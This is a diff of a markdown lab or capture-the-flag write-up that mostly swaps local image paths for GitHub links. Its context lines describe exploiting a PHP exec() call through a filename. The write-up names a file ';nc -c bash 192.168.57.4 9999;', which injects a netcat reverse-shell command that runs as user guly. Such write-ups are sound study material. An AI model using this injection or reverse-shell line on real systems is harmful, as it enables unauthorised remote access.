@@ -62,12 +62,12 @@ Server IP Address | Ports Open
 
 **Nmap Scan Results:**
 
-![Nmap scan](./imagem1.jpg)
+![Nmap scan](https://github.com/Alta-Cupula/Offensive/blob/main/imagem1.png)
 
 *Initial Shell Vulnerability Exploited*
 
 When enumerating the HTTP service, a "backup" directory was identified that has a directory listing issue and gave us access to a compressed file called "backup.tar".
-![Directory Listing](path/imagem2.jpg)
+![Directory Listing](https://github.com/Alta-Cupula/Offensive/blob/main/imagem2.png)
 
 After unzipping the file we can read the source codes:
 ![Source code - upload](path/uploadphp.jpg)
@@ -121,7 +121,7 @@ When accessing the user directory "guly" we do not have permission to read the f
 So when reading the file check_attacks.php we can see a variable "$path" that has the static value defined as "/var/www/html/uploads", however the variable "value" is created receiving the input of "files".
 The variable "files" is using PHP's "scandir" function passing the value "." meaning it wants to list all files and directories in THIS directory. Which means that if we create a file putting malicious content in the name PHP will probably try to execute it.
 So, creating a file called ";nc -c bash 192.168.57.4 9999;" we can get a reverse shell as guly because in line code would be: "exec("nohup /bin/rm -f /var/www/html/uploads;nc -c bash 192.168.57.4 9999; > /dev/null 2>&1 &")"
-![Malicious file](path/arquivomalicioso.jpg)
+![Malicious file](https://github.com/Alta-Cupula/Offensive/blob/main/arquivomalicioso.png)
 ![Reverse as guly](path/reverseasguly.jpg)
 ![Guly](path/gulyflag.jpg)
 
